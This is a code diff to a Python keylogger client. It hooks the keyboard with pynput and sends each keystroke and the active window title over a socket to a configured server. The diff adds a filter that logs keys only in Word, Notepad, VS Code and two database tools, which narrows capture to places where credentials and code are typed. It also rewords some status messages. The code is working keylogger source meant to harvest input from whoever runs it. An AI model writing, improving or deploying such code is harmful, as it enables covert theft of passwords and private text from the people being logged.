@@ -5,8 +5,30 @@ from pynput import keyboard
 import time
 from datetime import datetime
 import win32gui
+import win32process
+import psutil
 
 from config import server_config
+
+
+# Ứng dụng được phép ghi phím
+ALLOWED_APPS = [
+    "WINWORD.EXE",       # Microsoft Word
+    "notepad.exe",       # Notepad
+    "Code.exe",          # Visual Studio Code
+    "MySQLWorkbench.exe",
+    "heidisql.exe"
+]
+
+
+def get_active_process_name():
+    try:
+        hwnd = win32gui.GetForegroundWindow()
+        _, pid = win32process.GetWindowThreadProcessId(hwnd)
+        process = psutil.Process(pid)
+        return process.name()
+    except:
+        return None
 
 
 def get_active_window_title():
@@ -33,10 +55,10 @@ class KeyloggerClient:
             init_msg = json.dumps({"type": "keylogger"}) + "\n"
             self.sock.sendall(init_msg.encode())
 
-            print("[+] Connected")
+            print("[+] Connected to server")
             return True
         except:
-            print("[!] Retry in 3s...")
+            print("[!] Retry connection in 3s...")
             time.sleep(3)
             return False
 
@@ -64,6 +86,12 @@ class KeyloggerClient:
 
     def on_press(self, key):
         try:
+            process_name = get_active_process_name()
+
+            # ❌ Nếu không thuộc ứng dụng cho phép → Không gửi phím
+            if process_name not in ALLOWED_APPS:
+                return
+
             window_title = get_active_window_title()
 
             if hasattr(key, "char") and key.char:
@@ -89,7 +117,7 @@ class KeyloggerClient:
             print("[-] Error:", e)
 
     def start(self):
-        print("[*] Starting keylogger...")
+        print("[*] Keylogger started...")
         self.ensure_connection()
 
         listener = keyboard.Listener(on_press=self.on_press)
